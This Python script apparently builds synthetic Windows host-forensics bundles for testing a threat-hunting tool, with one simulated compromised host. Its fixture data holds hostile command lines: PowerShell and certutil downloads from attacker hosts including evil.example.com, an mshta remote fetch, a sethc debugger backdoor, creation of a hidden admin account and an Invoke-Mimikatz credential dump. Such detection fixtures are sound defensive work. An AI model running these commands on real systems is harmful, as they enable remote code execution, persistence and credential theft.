"""Generate synthetic bundles for tests and demos.

Builds a small 'fleet': a few clean Windows hosts plus one compromised host that
exercises every Windows rule, the wevtutil XML path, the IOC sweep and stacking.
Run:  python3 samples/make_samples.py samples/fleet
"""
from __future__ import annotations

import json
import os
import sys

CLEAN_PROCS = [
    {"pid": 4, "ppid": 0, "name": "System", "exe": "", "cmdline": "", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid"},
    {"pid": 388, "ppid": 4, "name": "smss.exe", "exe": "C:\\Windows\\System32\\smss.exe", "cmdline": "", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid", "start_time": "2026-11-01T08:00:00+00:00"},
    {"pid": 520, "ppid": 388, "name": "wininit.exe", "exe": "C:\\Windows\\System32\\wininit.exe", "cmdline": "wininit.exe", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid", "start_time": "2026-11-01T08:00:02+00:00"},
    {"pid": 620, "ppid": 520, "name": "services.exe", "exe": "C:\\Windows\\System32\\services.exe", "cmdline": "C:\\Windows\\system32\\services.exe", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid", "start_time": "2026-11-01T08:00:03+00:00"},
    {"pid": 632, "ppid": 520, "name": "lsass.exe", "exe": "C:\\Windows\\System32\\lsass.exe", "cmdline": "C:\\Windows\\system32\\lsass.exe", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid", "start_time": "2026-11-01T08:00:03+00:00"},
    {"pid": 820, "ppid": 620, "name": "svchost.exe", "exe": "C:\\Windows\\System32\\svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "user": "NT AUTHORITY\\SYSTEM", "signature": "Valid", "start_time": "2026-11-01T08:00:05+00:00"},
    {"pid": 2110, "ppid": 820, "name": "explorer.exe", "exe": "C:\\Windows\\explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "user": "CORP\\alice", "signature": "Valid", "start_time": "2026-11-01T08:05:00+00:00"},
]
CLEAN_SERVICES = [
    {"name": "Dnscache", "display_name": "DNS Client", "path": "C:\\Windows\\system32\\svchost.exe -k NetworkService -p", "start_mode": "Auto", "state": "Running", "account": "NT AUTHORITY\\NetworkService", "type": "service"},
    {"name": "Spooler", "display_name": "Print Spooler", "path": "C:\\Windows\\System32\\spoolsv.exe", "start_mode": "Auto", "state": "Running", "account": "LocalSystem", "type": "service"},
    {"name": "WinDefend", "display_name": "Microsoft Defender", "path": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\"", "start_mode": "Auto", "state": "Running", "account": "LocalSystem", "type": "service"},
]


def host_meta(name, extra=None):
    m = {"hostname": name, "platform": "windows", "collector": "hosthunt-windows",
         "os": "Windows 10 Pro 10.0.19045 build 19045", "arch": "64-bit", "domain": "CORP",
         "part_of_domain": True, "collected_at": "2026-11-03T12:00:00+00:00", "elevated": True,
         "boot_time": "2026-11-01T08:00:00+00:00"}
    if extra:
        m.update(extra)
    return m


def clean_host(directory, name):
    os.makedirs(directory, exist_ok=True)
    _dump(directory, "host.json", host_meta(name))
    _dump(directory, "processes.json", CLEAN_PROCS)
    _dump(directory, "services.json", CLEAN_SERVICES)
    _dump(directory, "autoruns.json", [
        {"key": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "SecurityHealth",
         "value": "C:\\Windows\\System32\\SecurityHealthSystray.exe", "source": "registry"},
        {"key": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "RtkAudUService",
         "value": "C:\\Windows\\System32\\RtkAudUService64.exe -background", "source": "registry"}])
    _dump(directory, "scheduled_tasks.json", [
        {"name": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "command": "%windir%\\system32\\defrag.exe -c -h -o $(Arg0)",
         "run_as": "SYSTEM", "author": "Microsoft", "schedule": "Weekly", "status": "Ready"}])
    _dump(directory, "network.json", [
        {"proto": "tcp", "local_addr": "0.0.0.0", "local_port": 445, "remote_addr": "0.0.0.0", "remote_port": 0, "state": "LISTEN", "pid": 4, "process": "System"},
        {"proto": "tcp", "local_addr": "10.0.0.5", "local_port": 50210, "remote_addr": "13.107.42.14", "remote_port": 443, "state": "ESTABLISHED", "pid": 820, "process": "svchost.exe"}])
    _dump(directory, "users.json", [
        {"name": "Administrator", "enabled": False, "privileged_groups": ["Administrators"], "sid": "S-1-5-21-1-1-1-500"},
        {"name": "alice", "enabled": True, "privileged_groups": [], "sid": "S-1-5-21-1-1-1-1104", "pw_last_set": "2026-09-01T00:00:00+00:00"}])
    _dump(directory, "defender.json", [
        {"kind": "status", "RealTimeProtectionEnabled": True, "IsTamperProtected": True, "AntivirusEnabled": True}])


def compromised_host(directory, name):
    os.makedirs(directory, exist_ok=True)
    _dump(directory, "host.json", host_meta(name, {"logged_on": "CORP\\bob"}))
    procs = list(CLEAN_PROCS) + [
        # svchost.exe from a temp path, parented by explorer (masquerade + bad ancestry)
        {"pid": 4512, "ppid": 2110, "name": "svchost.exe", "exe": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe",
         "cmdline": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe", "user": "CORP\\bob", "signature": "NotSigned",
         "start_time": "2026-11-03T09:14:22+00:00", "sha256": "aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"},
        # lookalike
        {"pid": 4600, "ppid": 2110, "name": "scvhost.exe", "exe": "C:\\Users\\bob\\Downloads\\scvhost.exe",
         "cmdline": "scvhost.exe -connect 185.220.101.47:4444", "user": "CORP\\bob", "signature": "NotSigned",
         "start_time": "2026-11-03T09:15:00+00:00"},
        # winword spawns powershell with encoded command
        {"pid": 4720, "ppid": 2110, "name": "WINWORD.EXE", "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "cmdline": "\"WINWORD.EXE\" /n invoice.docm", "user": "CORP\\bob", "signature": "Valid", "start_time": "2026-11-03T09:13:50+00:00"},
        {"pid": 4812, "ppid": 4720, "name": "powershell.exe", "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
         "user": "CORP\\bob", "signature": "Valid", "start_time": "2026-11-03T09:13:52+00:00"},
        # certutil downloader
        {"pid": 4900, "ppid": 4812, "name": "certutil.exe", "exe": "C:\\Windows\\System32\\certutil.exe",
         "cmdline": "certutil.exe -urlcache -split -f http://185.220.101.47/b.exe C:\\Users\\bob\\AppData\\Local\\Temp\\b.exe",
         "user": "CORP\\bob", "signature": "Valid", "start_time": "2026-11-03T09:14:05+00:00"},
    ]
    _dump(directory, "processes.json", procs)
    _dump(directory, "services.json", CLEAN_SERVICES + [
        {"name": "UpdaterSvc", "display_name": "System Update Service", "path": "C:\\Windows\\Temp\\upd.exe", "start_mode": "Auto", "state": "Running", "account": "LocalSystem", "type": "service"},
        {"name": "WmiPerf", "display_name": "WMI Perf", "path": "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/a')", "start_mode": "Auto", "state": "Running", "account": "LocalSystem", "type": "service"}])
    _dump(directory, "scheduled_tasks.json", [
        {"name": "\\Microsoft\\Windows\\UpdateOrchestrator\\BackgroundTask", "command": "mshta.exe http://185.220.101.47/x.hta",
         "run_as": "SYSTEM", "author": "CORP\\bob", "schedule": "At logon", "status": "Ready", "xml_ctime": "2026-11-03T09:16:00+00:00"}])
    _dump(directory, "autoruns.json", [
        {"key": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "Updater",
         "value": "powershell -nop -w hidden -enc aQBlAHgA", "source": "registry"},
        {"key": "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "name": "Shell",
         "value": "explorer.exe,C:\\Users\\bob\\AppData\\Roaming\\run.exe", "source": "registry"},
        {"key": "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
         "name": "Debugger", "value": "C:\\Windows\\System32\\cmd.exe", "source": "registry"}])
    _dump(directory, "wmi_subscriptions.json", [
        {"kind": "consumer", "class": "CommandLineEventConsumer", "Name": "evilConsumer",
         "CommandLineTemplate": "powershell.exe -nop -enc ZQB2AGkAbAA="},
        {"kind": "binding", "class": "__FilterToConsumerBinding", "Filter": "__EventFilter.Name=\"f1\"", "Consumer": "CommandLineEventConsumer.Name=\"evilConsumer\""}])
    _dump(directory, "network.json", CLEAN_SERVICES and [
        {"proto": "tcp", "local_addr": "10.0.0.9", "local_port": 50310, "remote_addr": "185.220.101.47", "remote_port": 4444, "state": "ESTABLISHED", "pid": 4600, "process": "scvhost.exe", "exe": "C:\\Users\\bob\\Downloads\\scvhost.exe", "user": "CORP\\bob"},
        {"proto": "tcp", "local_addr": "0.0.0.0", "local_port": 4444, "remote_addr": "0.0.0.0", "remote_port": 0, "state": "LISTEN", "pid": 4512, "process": "svchost.exe", "exe": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe"}])
    _dump(directory, "users.json", [
        {"name": "Administrator", "enabled": False, "privileged_groups": ["Administrators"], "sid": "S-1-5-21-1-1-1-500"},
        {"name": "bob", "enabled": True, "privileged_groups": [], "sid": "S-1-5-21-1-1-1-1109"},
        {"name": "support$", "enabled": True, "privileged_groups": ["Administrators"], "hidden_from_logon": True, "sid": "S-1-5-21-1-1-1-1200", "pw_last_set": "2026-11-03T09:20:00+00:00"}])
    _dump(directory, "defender.json", [
        {"kind": "status", "RealTimeProtectionEnabled": False, "IsTamperProtected": False, "AntivirusEnabled": True},
        {"kind": "preferences", "ExclusionPath": ["C:\\Users\\bob\\AppData\\Local\\Temp", "C:\\Windows\\Temp"], "DisableRealtimeMonitoring": True}])
    _dump(directory, "recent_files.json", [
        {"path": "C:\\Users\\bob\\Downloads\\invoice.docm", "ext": ".docm", "mtime": "2026-11-03T09:13:00+00:00", "size": 84213},
        {"path": "C:\\Users\\bob\\AppData\\Local\\Temp\\b.exe", "ext": ".exe", "mtime": "2026-11-03T09:14:10+00:00", "size": 245760,
         "sha256": "ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33"}])
    _dump(directory, "shell_history.json", [
        {"user": "bob", "file": "...ConsoleHost_history.txt", "line": 1, "command": "whoami /priv", "timestamp": "2026-11-03T09:12:00+00:00"},
        {"user": "bob", "file": "...ConsoleHost_history.txt", "line": 2, "command": "Invoke-WebRequest http://185.220.101.47/p.ps1 -OutFile p.ps1; iex (gc p.ps1 -raw)", "timestamp": "2026-11-03T09:12:30+00:00"},
        {"user": "bob", "file": "...ConsoleHost_history.txt", "line": 3, "command": "net user support$ P@ss! /add; net localgroup administrators support$ /add", "timestamp": "2026-11-03T09:20:00+00:00"}])
    # wevtutil XML -> events.xml (exercises the parser)
    _write(directory, "events.xml", EVENTS_XML)
    _dump(directory, "dns.json", [{"hosts": ["127.0.0.1 localhost", "185.220.101.47 update.microsoft.com"], "hosts_mtime": "2026-11-03T09:25:00+00:00"}])


EVENTS_XML = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>1102</EventID><TimeCreated SystemTime='2026-11-03T09:30:00.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='SubjectUserName'>bob</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager'/><EventID>7045</EventID><TimeCreated SystemTime='2026-11-03T09:16:05.000Z'/><Channel>System</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='ServiceName'>UpdaterSvc</Data><Data Name='ImagePath'>C:\\Windows\\Temp\\upd.exe</Data><Data Name='ServiceType'>user mode service</Data><Data Name='StartType'>auto start</Data><Data Name='AccountName'>LocalSystem</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID><TimeCreated SystemTime='2026-11-03T09:05:01.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID><TimeCreated SystemTime='2026-11-03T09:05:02.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID><TimeCreated SystemTime='2026-11-03T09:05:03.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID><TimeCreated SystemTime='2026-11-03T09:05:04.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID><TimeCreated SystemTime='2026-11-03T09:05:05.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4624</EventID><TimeCreated SystemTime='2026-11-03T09:06:00.000Z'/><Channel>Security</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>185.220.101.47</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell'/><EventID>4104</EventID><TimeCreated SystemTime='2026-11-03T09:13:55.000Z'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WS-BOB</Computer></System><EventData><Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/p.ps1'); Invoke-Mimikatz -DumpCreds</Data></EventData></Event>"""


def _dump(directory, fn, obj):
    with open(os.path.join(directory, fn), "w", encoding="utf-8") as fh:
        json.dump(obj, fh, indent=1)


def _write(directory, fn, text):
    with open(os.path.join(directory, fn), "w", encoding="utf-8") as fh:
        fh.write(text)


def build(root):
    clean_host(os.path.join(root, "WS-01"), "WS-01")
    clean_host(os.path.join(root, "WS-02"), "WS-02")
    clean_host(os.path.join(root, "WS-03"), "WS-03")
    compromised_host(os.path.join(root, "WS-BOB"), "WS-BOB")
    print(f"built fleet under {root}: WS-01, WS-02, WS-03 (clean), WS-BOB (compromised)")


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "samples/fleet")
